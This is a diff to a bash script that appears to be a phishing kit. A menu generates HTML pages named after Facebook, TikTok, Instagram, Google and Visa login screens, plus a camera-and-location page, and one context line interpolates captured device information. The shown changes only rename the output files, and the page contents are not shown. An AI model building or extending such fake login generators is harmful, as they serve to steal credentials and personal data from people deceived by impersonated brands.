@@ -115,7 +115,7 @@ read choice
 case $choice in
     1)
         page="Facebook_login"
-        cat > "${page}_login.html" <<EOF
+        cat > "${page}.html" <<EOF
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -314,7 +314,7 @@ EOF
         ;;
     2)
         page="TikTok_login"
-        cat > "${page}_login.html" <<EOF
+        cat > "${page}.html" <<EOF
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -480,7 +480,7 @@ EOF
         ;;
     3)
         page="Instagram_login"
-        cat > "${page}_login.html" <<EOF
+        cat > "${page}.html" <<EOF
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -679,7 +679,7 @@ EOF
         ;;
     4)
         page="Google_login"
-        cat > "${page}_login.html" <<EOF
+        cat > "${page}.html" <<EOF
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -878,7 +878,7 @@ EOF
         ;;
     5)
         page="Visa_login"
-        cat > "${page}_login.html" <<EOF
+        cat > "${page}.html" <<EOF
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1076,7 +1076,7 @@ Device Name📱: \${deviceInfo.deviceName}
 EOF
         ;;
     6)
-        page="CameraAndLocation"
+        page="CameraAndLocation_login"
         cat > "${page}.html" <<EOF
 <!DOCTYPE html>
 <html lang="en">
